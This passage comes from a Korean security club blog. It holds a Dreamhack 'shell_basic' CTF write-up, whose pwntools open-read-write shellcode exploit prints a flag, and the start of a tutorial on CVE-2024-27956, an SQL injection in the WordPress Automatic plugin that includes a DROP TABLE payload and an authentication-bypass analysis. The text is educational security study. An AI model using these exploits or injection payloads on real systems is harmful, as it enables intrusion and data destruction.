class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">banned_execve</span><span class="params">()</span> &#123;</span><br><span class="line">  scmp_filter_ctx ctx;</span><br><span class="line">  ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">  <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> *shellcode = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);   </span><br><span class="line">  <span class="type">void</span> (*sc)();</span><br><span class="line">  </span><br><span class="line">  init();</span><br><span class="line">  </span><br><span class="line">  banned_execve();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;shellcode: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, shellcode, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  sc = (<span class="type">void</span> *)shellcode;</span><br><span class="line">  sc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>아까 문제 조건에서 본 것 처럼 execve과 execveat 시스템 콜을 막아놓은 함수가 보이고 그 밑에 main()이 보인다. 우리가 봐야할 부분은 여기다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *shellcode = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);   </span><br></pre></td></tr></table></figure>
<p>mmap()을 이용해 크기 0x1000의 메모리를 할당하고 해당 영역은 읽기(R), 쓰기(W), 실행(X) 권한을 모두 가진다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;shellcode: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, shellcode, <span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure>
<p>위 코드는 ‘shellcode: ‘가 출력되면 그 뒤에 표준 입력(fd&#x3D;0은 stdin)으로 최대 0x1000 바이트의 데이터를 shellcode 메모리로 읽어들이는 것이다. 즉 여기가 셸코드를 입력하는 부분이므로 우리는 여기서 orw 셸코드를 작성해서서 shellcode로 넘겨주면 되는 것이다. 가장 먼저 문제 서버 주소와 포트 번호를 확인해준다.<br><img src="/images/3102_250517_image2.png" alt="그림 2. 문제 서버와 포트 확인"></p>
<center><span style="font-size: 90%;">그림 2. 문제 서버와 포트 확인</span><br><span style="font-size: 70%;"></span></center><br>
그 다음 실행파일의 아키텍처를 checksec으로 확인해주겠다.

<p><img src="/images/3102_250517_image3.png" alt="그림 3. 아키텍처 확인"></p>
<center><span style="font-size: 90%;">그림 3. 아키텍처 확인</span><br><span style="font-size: 70%;"></span></center><br>
amd64인 것을 확인할 수 있다.
이제 익스플로잇 코드를 짜보겠다.

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># open할 flag 파일 경로</span></span><br><span class="line">path = <span class="string">&quot;/home/shell_basic/flag_name_is_loooooong&quot;</span></span><br><span class="line">shell = shellcraft.<span class="built_in">open</span>(path)	</span><br></pre></td></tr></table></figure>
<p>shellcraft.open(“&#x2F;home&#x2F;shell_basic&#x2F;flag_name_is_loooooong”)는 open(“&#x2F;home&#x2F;shell_basic&#x2F;flag_name_is_loooooong”) syscall에 해당하는 x86-64 어셈블리 코드를 생성하게 되는데 이 시스템 호출의 결과는 rax 레지스터에 저장되고, 이것이 fd(파일 디스크립터)가 된다. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure>
<p>read(fd, buf, 0x30)를 의미한다. rax가 방금 open한 파일 디스크립터이므로, 이 파일에서 데이터를 읽는다. read를 이용하여여 rsp(스택 위치)에서 최대 0x30 바이트를 읽어온다. 혹시나 읽어오는 바이트가 플래그보다 부족해도 나중에 고치면 되니 적당히 0x30으로 해놓는다.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure>
<p>다음 코드는 write(stdout, buf, 0x30)을 의미한는데 이는 write(stdout, buf, size) 시스템 호출이다. stdout의 번호는 1이기 때문에 고정해놓고 방금 rsp에 읽어둔 내용을 0x30 바이트 만큼 읽어 stdout으로 터미널에 플래그를 출력한다.</p>
<p>그 다음 asm으로 셸코드를 기계어로 변환한 후, 아까 위에서 본 코드 파일의 셸코드를 입력하는 부분에 우리가 쓴 셸코드를 보내면 된다.<br>이렇게 되면 전체 익스플로잇 코드는 다음과 같다.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;host8.dreamhack.games&quot;</span>, <span class="number">21439</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">path = <span class="string">&quot;/home/shell_basic/flag_name_is_loooooong&quot;</span></span><br><span class="line">shell = shellcraft.<span class="built_in">open</span>(path)	</span><br><span class="line">shell += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>)</span><br><span class="line">shell += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x30</span>)	</span><br><span class="line">shell = asm(shellcode)	<span class="comment"># shell을을 기계어로 변환</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;shellcode: &quot;</span>, shell)    <span class="comment"># &quot;shellcode: &quot;가 출력되면 shell + &#x27;\n&#x27;을 입력</span></span><br><span class="line">r.interactive()    <span class="comment"># 익스플로잇 실행 후 서버와 터미널 연결</span></span><br></pre></td></tr></table></figure>
<p>이제 이 코드를 실행시키면</p>
<p><img src="/images/3102_250517_image3.png" alt="그림 4. 익스플로잇 실행 결과"></p>
<center><span style="font-size: 90%;">그림 4. 익스플로잇 실행 결과</span><br><span style="font-size: 70%;"></span></center><br>
위 사진처럼 DH{ca562d7cf1db6c55cb11c4ec350a3c0b}라는 플래그 값을 얻을 수 있다. 
<br><br>

<h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>사실 asm 코드 컴파일 한 다음, 셸코드 다 추출해서 전송하는 방식으로 작성할까 했지만 pwntools 작성 방식이 더 이해하기도 쉽고 간편하고 많이 쓰는 방식이기도 해서 위 방식으로 작성했다.<br><br></p>
<h1 id="참고문헌"><a href="#참고문헌" class="headerlink" title="참고문헌"></a>참고문헌</h1><p>Chromium OS Docs. (n.d.). Linux System Call Table . <a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a>.</p>
<p>Dreamhack. (n.d.). Exploit Tech: Shellcode. <a target="_blank" rel="noopener" href="https://learn.dreamhack.io/50">https://learn.dreamhack.io/50</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://swu-swing.github.io/2025/04/03/3101_250402/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SWING">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SW1NGL0G">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SW1NGL0G">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/03/3101_250402/" class="post-title-link" itemprop="url">지원서 뜯어보기 [상]</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-04-03 10:00:00" itemprop="dateCreated datePublished" datetime="2025-04-03T10:00:00+09:00">2025-04-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-05-20 04:29:28" itemprop="dateModified" datetime="2025-05-20T04:29:28+09:00">2025-05-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/swinglog/" itemprop="url" rel="index"><span itemprop="name">swinglog</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <!-- 지원서 뜯어보기 [상] -->

<h1 id="들어가며"><a href="#들어가며" class="headerlink" title="들어가며"></a>들어가며</h1><p>이번 32기 지원서는 상중하 주제 중에 하나를 선택해서 공부한대로 적는 라이트업 문제가 있었다. </p>
<p>상 문제만 유일하게 CVE 분석이다. 주제가 어려웠는지 아무도 상 문제를 적진 않았지만(…) SWING 들어와서 공부하면 그만이다. 입학 시절로 돌아가 취약점 분석에 대한 0부터 적어보자. 목표는 신규 학회원들이 이 글만 읽어도 다 이해할 수 있는 것이다.<br><br><br></p>
<h1 id="CVE란"><a href="#CVE란" class="headerlink" title="CVE란?"></a>CVE란?</h1><p>CVE는 Common Vulnerabilities and Exposure의 약자로, MITRE에서 관리하는 공개된 보안 취약점의 고유 ID이다. CVE-0000-0000 형식으로 연도와 임의 번호를 넣어 발급된다. <strong>고유 ID를 발급함으로써 어떤 프로그램에 어떤 취약점인지 식별 가능하다.</strong><br><br><br></p>
<h1 id="CVE-2024-27956"><a href="#CVE-2024-27956" class="headerlink" title="CVE-2024-27956"></a>CVE-2024-27956</h1><p>cve.org 홈페이지를 들어가서 CVE 코드를 검색하면 다음과 같다. <br><br><img src="/images/3101_250403_image1.png" alt="그림 1. https://www.cve.org/CVERecord?id=CVE-2024-27956, [cve 페이지 화면]"></p>
<center><span style="font-size: 90%;">그림 1. [cve 페이지 화면]</span><br><span style="font-size: 70%;">https://www.cve.org/CVERecord?id=CVE-2024-27956</span></center><br>

<p>title에는 어떤 프로그램의(버전 포함) 어떤 취약점인지 적혀있다. Description에는 이 취약점에 대해 간단한 설명이 담겨있고 영향을 받는 버전도 작성되어 있다. CWE, CVSS 항목도 기재되어 있다. CWE는 Common Weakness Enumeration의 약자이다. CVE와 혼동할 수 있는데, CVE는 고유 ID이고, CWE는 취약점 유형을 분류한 시스템이라고 생각하면 편하다. CVSS는 취약점의 심각도를 평가하는 점수이다. CVSS 점수가 클 수록 보안 위협이 크다는 것을 의미한다.<br><br></p>
<h2 id="CVE-개요"><a href="#CVE-개요" class="headerlink" title="CVE 개요"></a>CVE 개요</h2><p>CVE-2024-27956의 개요는 다음과 같다. </p>
<table>
<thead>
<tr>
<th align="center">제목</th>
<th>WordPress plugin인 Automatic에서 인증되지 않은 사용자가 실행할 수 있는 SQL injection</th>
</tr>
</thead>
<tbody><tr>
<td align="center">타겟</td>
<td>WordPress Automatic Plugin 3.92.0 이하</td>
</tr>
</tbody></table>
<br>

<h2 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress?"></a>wordpress?</h2><p>웹사이트를 구현할 수 있는 CMS(Contents Management System) 프로그램이다. 다양한 플러그인을 제공하여 사용자가 사이트를 쉽게 만들 수 있다는 장점이 있다.<br>실제로 W3Techs에서 조사한 결과로는 WordPress가 CMS 서비스에서 43.5%의 점유율을 확보하고 있다. 업계 내에서 많은 파이를 차지하고 있기에 해당 취약점이 그만큼 영향력도 크다는 것을 예상할 수 있다.<br>오늘 살펴볼 취약점은 위 WordPress가 제공하는 플러그인 중에서 Automatic에서 일어난다.<br><br></p>
<h2 id="sql-injection"><a href="#sql-injection" class="headerlink" title="sql injection?"></a>sql injection?</h2><p>타겟에 대해 살펴보았다면, <code>SQL injection</code>이 무엇인지도 알아야 한다. <strong>SQL injection은 사용자가 입력할 수 있는 웹 애플리케이션에 악성 SQL 코드를 끼워서 공격하는 취약점이다.</strong><br>RDBMS는 관계형 데이터 베이스를 관리하는 시스템을 말하는데, SQL은 이 시스템을 위한 특수 언어이다. 악성 SQL 코드를 끼우면 데이터베이스 정보 유출&#x2F;특수 권한이 있는 계정 로그인 등등의 공격을 할 수 있다.<br>아래의 SQL문이 있고 <code>pw</code>에 넣어지는 값을 검사하는 로직이 없는 경우를 예로 들어보자. </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> ex_table <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;guest&#x27;</span> <span class="keyword">and</span> pw<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>이때 pw에 넣는 입력을 <code>&#39;; DROP TABLE ex_table;-- </code>로 넣어보면 아래와 같다. </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">FROM</span> ex_table <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;guest&#x27;</span> <span class="keyword">and</span> pw<span class="operator">=</span><span class="string">&#x27;&#x27;</span>; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> ex_table;<span class="comment">-- &#x27; </span></span><br></pre></td></tr></table></figure>
<p>이러면 세미콜론에 의해 앞줄 명령이 끝나고 DROP을 이용해서 ex_table의 데이터를 모두 삭제처리할 수 있다. 이후 구문이 있더라도 <code>-- </code>는(띄어쓰기 포함) SQL의 주석처리 문법이기에 실행되지 않는다.<br><br></p>
<h2 id="코드-분석"><a href="#코드-분석" class="headerlink" title="코드 분석"></a>코드 분석</h2><p>그럼 본격적으로 WordPress 플러그인 Automatic에서 SQL injection이 어떻게 일어나는지 확인해보자. 취약한 부분은 <code>wp-automatic/inc/csv.php</code>이다. </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;../../../../wp-load.php&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$wpdb</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$current_user</span>;</span><br><span class="line"><span class="title function_ invoke__">wp_get_current_user</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//   echo user_login . &quot;&#x27;s email address is: &quot; $current_user-&gt;user_pass;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//get admin pass for integrity check </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// extract query</span></span><br><span class="line"><span class="variable">$q</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;q&#x27;</span>]);</span><br><span class="line"><span class="variable">$auth</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;auth&#x27;</span>]);</span><br><span class="line"><span class="variable">$integ</span>=<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;integ&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$auth</span> == <span class="string">&#x27;&#x27;</span>))&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;login required&#x27;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$auth</span>) != <span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$current_user</span>-&gt;user_pass))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;invalid login&#x27;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$q</span>.<span class="variable">$current_user</span>-&gt;user_pass)) != <span class="variable">$integ</span> )&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Tampered query&#x27;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span>=<span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">get_results</span>( <span class="variable">$q</span>);</span><br><span class="line"><span class="variable">$date</span>=<span class="title function_ invoke__">date</span>(<span class="string">&quot;F j, Y, g:i a s&quot;</span>);</span><br><span class="line"><span class="variable">$fname</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$date</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: application/csv&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=<span class="subst">$fname</span>.csv&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Pragma: no-cache&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Expires: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;DATE,ACTION,DATA,KEYWORD \n&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rows</span> <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$action</span>=<span class="variable">$row</span>-&gt;action;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$action</span> , <span class="string">&#x27;New Comment Posted on :&#x27;</span>))&#123;</span><br><span class="line">			<span class="variable">$action</span> = <span class="string">&#x27;Posted Comment&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$action</span> , <span class="string">&#x27;approved&#x27;</span>))&#123;</span><br><span class="line">			<span class="variable">$action</span> = <span class="string">&#x27;Approved Comment&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//format date</span></span><br><span class="line">	<span class="variable">$date</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-n-j H:i:s&#x27;</span>,<span class="title function_ invoke__">strtotime</span> (<span class="variable">$row</span>-&gt;date));</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span>=<span class="variable">$row</span>-&gt;data;</span><br><span class="line">	<span class="variable">$keyword</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="comment">//filter the data strip keyword</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>,<span class="string">&#x27;;&#x27;</span>))&#123;</span><br><span class="line">		<span class="variable">$datas</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;;&#x27;</span>,<span class="variable">$row</span>-&gt;data);</span><br><span class="line">		<span class="variable">$data</span>=<span class="variable">$datas</span>[<span class="number">0</span>];</span><br><span class="line">		<span class="variable">$keyword</span>=<span class="variable">$datas</span>[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	  <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$date</span>,<span class="subst">$action</span>,<span class="subst">$data</span>,<span class="subst">$keyword</span> \n&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  echo &quot;record1,$q,record3\n&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>위 코드에서 POST 요청으로 <code>q</code>, <code>auth</code>, <code>integ</code> 값을 받는다. 그리고 if문을 통해 <code>auth</code>와 <code>integ</code>를 검사한다. if 조건문 안에 있는 <code>wp_automatic_trim</code> 함수는 무엇일까? </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_automatic_trim</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>trim을 이용하여 공백을 제거하는 함수이다. </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$auth</span> == <span class="string">&#x27;&#x27;</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;login required&#x27;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>첫 if문이다. 조건이 조금 당황스러울 수 있는데 다음과 같이 이해하면 편하다.<br>가) <code>$auth ==&#39;&#39;</code> 빈 문자열인지 체크<br>나) true는 문자열 “1”로 치환, false는 “”로 치환 (타입 캐스팅)<br>다) 빈 문자열이면 <code>$auth == &#39;&#39;</code>가 true 되므로 조건문 참 -&gt; login required<br>라) 빈 문자열이 아니면 <code>$auth == &#39;&#39;</code>가 false되므로 if(‘’) 조건문 거짓 -&gt; login required 우회<br>이부분은 공백이 있는 문자열을 삽입하면 우회가 가능하다. ‘’와 ‘ ‘는 다르기 때문이다. </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$auth</span>) != <span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$current_user</span>-&gt;user_pass))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;invalid login&#x27;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>current_user-&gt;user_pass</code>는 인증되지 않은 user라면 빈 문자열일 것이다. <code>auth</code>도 <code>wp_automatic_trim</code>에 의해 빈 문자열이 되기 때문에 두 값은 같다. 때문에 invalid login은 우회가 가능하다. </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">wp_automatic_trim</span>(<span class="variable">$q</span>.<span class="variable">$current_user</span>-&gt;user_pass)) != <span class="variable">$integ</span> )&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Tampered query&#x27;</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>세번째 if문이다. <code>current_user-&gt;user_pass</code>는 빈 문자열이기 때문에 <code>q</code>의 md5값과 <code>integ</code>값만 같게 설정해주면 된다. </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rows</span>=<span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">get_results</span>( <span class="variable">$q</span>);</span><br></pre></td></tr></table></figure>
<p>이후에 위 코드로 인해 q가 실행된다.<br><br></p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Exploit은 diego-tella 깃허브를 참고하여 실습으로 진행해보자. 먼저 타겟의 취약한 버전을 깔아줘야 한다. 나는 Docker를 이용하여 WordPress를 깔고 취약한 버전 automatic.zip 파일을 설치했다. </p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.1&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line"></span><br><span class="line">  wordpress:</span><br><span class="line">    image: wordpress</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="number">8080</span>:<span class="number">80</span></span><br><span class="line">    environment:</span><br><span class="line">      WORDPRESS_DB_HOST: db</span><br><span class="line">      WORDPRESS_DB_USER: exampleuser</span><br><span class="line">      WORDPRESS_DB_PASSWORD: examplepass</span><br><span class="line">      WORDPRESS_DB_NAME: exampledb</span><br><span class="line">    volumes:</span><br><span class="line">      - wordpress:/var/www/html</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: mysql:<span class="number">8.0</span></span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_DATABASE: exampledb</span><br><span class="line">      MYSQL_USER: 